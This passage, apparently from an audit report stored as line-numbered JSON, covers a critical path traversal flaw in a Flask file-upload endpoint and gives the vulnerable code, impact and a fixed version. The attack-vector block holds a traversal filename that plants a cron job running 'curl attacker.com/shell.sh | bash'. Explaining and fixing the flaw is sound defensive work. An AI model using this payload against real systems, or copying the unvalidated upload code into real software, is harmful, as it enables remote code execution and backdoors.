    {
      "line": 484,
      "text": "### 2. CVE-CANDIDATE-002: Path Traversal in `/api/upload` Endpoint\n"
    },
    {
      "line": 485,
      "text": "\n"
    },
    {
      "line": 486,
      "text": "**Severity:** CRITICAL (CVSS 3.1: 9.1 - AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N)  \n"
    },
    {
      "line": 487,
      "text": "**Location:** `src/main.py`, lines 124-135  \n"
    },
    {
      "line": 488,
      "text": "**Type:** CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')\n"
    },
    {
      "line": 489,
      "text": "\n"
    },
    {
      "line": 490,
      "text": "#### Description\n"
    },
    {
      "line": 491,
      "text": "The file upload endpoint uses user-supplied filename without validation, allowing directory traversal to write arbitrary files anywhere the application has write permissions.\n"
    },
    {
      "line": 492,
      "text": "\n"
    },
    {
      "line": 493,
      "text": "#### Vulnerable Code\n"
    },
    {
      "line": 494,
      "text": "```python\n"
    },
    {
      "line": 495,
      "text": "@app.route('/api/upload', methods=['POST'])\n"
    },
    {
      "line": 496,
      "text": "def upload_file():\n"
    },
    {
      "line": 497,
      "text": "    file = request.files['file']\n"
    },
    {
      "line": 498,
      "text": "    filename = file.filename\n"
    },
    {
      "line": 499,
      "text": "    file.save(f\"/uploads/{filename}\")  # No path validation!\n"
    },
    {
      "line": 500,
      "text": "```\n"
    },
    {
      "line": 501,
      "text": "\n"
    },
    {
      "line": 502,
      "text": "#### Attack Vector\n"
    },
    {
      "line": 503,
      "text": "```\n"
    },
    {
      "line": 504,
      "text": "POST /api/upload\n"
    },
    {
      "line": 505,
      "text": "Content-Type: multipart/form-data\n"
    },
    {
      "line": 506,
      "text": "\n"
    },
    {
      "line": 507,
      "text": "file: (filename=\"../../../etc/cron.d/backdoor\", content=\"* * * * * root curl attacker.com/shell.sh | bash\")\n"
    },
    {
      "line": 508,
      "text": "```\n"
    },
    {
      "line": 509,
      "text": "\n"
    },
    {
      "line": 510,
      "text": "#### Impact\n"
    },
    {
      "line": 511,
      "text": "- Arbitrary file write leading to RCE (cron, systemd, SSH keys, web shell)\n"
    },
    {
      "line": 512,
      "text": "- Overwrite application code for persistence\n"
    },
    {
      "line": 513,
      "text": "- Plant backdoors in startup scripts\n"
    },
    {
      "line": 514,
      "text": "\n"
    },
    {
      "line": 515,
      "text": "#### Remediation\n"
    },
    {
      "line": 516,
      "text": "```python\n"
    },
    {
      "line": 517,
      "text": "import os\n"
    },
    {
      "line": 518,
      "text": "from werkzeug.utils import secure_filename\n"
    },
    {
      "line": 519,
      "text": "\n"
    },
    {
      "line": 520,
      "text": "@app.route('/api/upload', methods=['POST'])\n"
    },
    {
      "line": 521,
      "text": "def upload_file():\n"
    },
    {
      "line": 522,
      "text": "    file = request.files['file']\n"
    },
    {
      "line": 523,
      "text": "    filename = secure_filename(file.filename)\n"
    },
    {
      "line": 524,
      "text": "    \n"
    },
    {
      "line": 525,
      "text": "    # Additional validation\n"
    },
    {
      "line": 526,
      "text": "    if not filename or '.' not in filename:\n"
    },
    {
      "line": 527,
      "text": "        return jsonify({'error': 'Invalid filename'}), 400\n"
    },
    {
      "line": 528,
      "text": "    \n"
    },
    {
      "line": 529,
      "text": "    # Restrict to safe extensions\n"
    },
    {
      "line": 530,
      "text": "    allowed_extensions = {'txt', 'pdf', 'png', 'jpg', 'json', 'csv'}\n"
    },
    {
      "line": 531,
      "text": "    if filename.rsplit('.', 1)[1].lower() not in allowed_extensions:\n"
    },
    {
      "line": 532,
      "text": "        return jsonify({'error': 'File type not allowed'}), 400\n"
    },
    {
      "line": 533,
      "text": "    \n"
    },
    {
      "line": 534,
      "text": "    # Use safe path joining\n"
    },
    {
      "line": 535,
      "text": "    upload_dir = \"/uploads\"\n"
    },
    {
      "line": 536,
      "text": "    os.makedirs(upload_dir, exist_ok=True)\n"
    },
    {
      "line": 537,
      "text": "    filepath = os.path.join(upload_dir, filename)\n"
    },
    {
      "line": 538,
      "text": "    \n"
    },
    {
      "line": 539,
      "text": "    # Prevent overwriting\n"
    },
    {
      "line": 540,
      "text": "    if os.path.exists(filepath):\n"
    },
    {
      "line": 541,
      "text": "        return jsonify({'error': 'File already exists'}), 409\n"
    },
    {
      "line": 542,
      "text": "    \n"
    },
    {
      "line": 543,
      "text": "    file.save(filepath)\n"
    },
    {
      "line": 544,
      "text": "    return jsonify({'message': 'File uploaded successfully'}), 201\n"
    },
    {
      "line": 545,
      "text": "```\n"
